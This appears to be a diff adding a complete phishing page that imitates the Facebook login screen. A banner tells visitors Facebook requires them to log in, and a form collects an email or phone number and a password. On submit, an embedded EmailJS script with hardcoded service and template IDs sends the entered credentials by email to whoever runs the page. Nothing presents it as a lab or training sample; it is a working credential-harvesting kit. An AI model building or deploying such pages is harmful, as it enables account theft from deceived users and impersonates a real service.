@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    
+</script>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    
+    <div class="container">
+     
+  <div class="request">
+     To visit ths site, Facebook request you must log into your account 
+    </div>   <br>
+    <span>English (UK)</span>
+    <br>
+    <br>
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
+        </div>
+       
+       <br>
+       <br>
+   
+   <br>
+        <form id="contact-form">
+        <h2>Log into your account</h2>  
+        <br>
+        <br>
+            <div class="input-group">
+                <input type="text" name="name" placeholder="Email or phone" required>
+            </div>
+            <div class="input-group">
+                <input name="message" placeholder="password" type="password" required>
+            </div>
+  <button type="submit" class="login-button">Log In</button>
+        </form>
+      
+    </div>
+    <style>
+        .note{
+border:border-box;
+width:100%;
+    padding-left:;
+    padding-right:;
+    font-family: fantasy;
+    font-size:0.9rem;
+    display:block;
+   
+    
+}
+h2{
+    font-family:fantasy;
+}
+hr{
+  width:370px;
+}
+        .span{
+            color:grey;
+        }
+      *{
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+}
+.request{
+    background:#40cbff;
+    width:100%;
+    height:40px;
+    color:black;
+    font-family:fantasy;
+    font-size:0.8rem;
+    padding:3px 0px;
+    padding-top:9px;
+    text-align: center;
+    position:fixed;
+    top:0;
+    left:0;
+   
+}
+body {
+    font-family: Arial, sans-serif;
+    background-color: #f0f2f5;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+}
+
+.container {
+    background: white;
+    padding: 40px;
+    box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+    width:100%;
+    height:100vh;
+    text-align: center;
+}
+
+.logo img {
+    width:60px;
+    margin-bottom: 20px;
+}
+
+h1 {
+    font-size: 24px;
+    margin-bottom: 20px;
+}
+
+.input-group {
+    margin-bottom: 15px;
+}
+
+input {
+    width: 100%;
+    padding: 10px;
+    border: 1px solid #ccc;
+    border-radius: 5px;
+    font-size: 14px;
+    padding: 18px;
+    width:400px;
+    border:1px solid grey;
+    border-radius: 10px;
+    display:block;
+    margin-left:-4%;
+}
+
+input:focus {
+    border-color: #1877f2;
+    outline: none;
+}
+
+.login-button {
+    background-color: #1877f2;
+    color: white;
+    padding: 10px;
+    border: none;
+    border-radius: 5px;
+    font-size: 16px;
+    cursor: pointer;
+    width: 100%;
+    padding:16px;
+    width:400px;
+    margin-left:-4%;
+    border-radius:20px;
+}
+
+.login-button:hover {
+    background-color: #165eab;
+}
+
+.links {
+    margin-top: 15px;
+}
+
+.links a {
+    color: #1877f2;
+    text-decoration: none;
+    display: block;
+    margin-top: 5px;
+}
+
+.links a:hover {
+    text-decoration: underline;
+}  
+    </style>
+    
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script>
+        (function(){
+            emailjs.init("_nN0Nz36ijTDJqRip"); // Replace with your EmailJS user ID
+        })();
+
+        document.getElementById('contact-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+            
+
+            emailjs.sendForm('service_hh3sygh', 'template_vheqxsd', this)
+                .then(function() {
+                    alert('Email sent successfully!');
+                }, function(error) {
+                    alert('Failed to send email: ' + JSON.stringify(error));
+                });
+        });
+    </script>
+</body>
+</html>
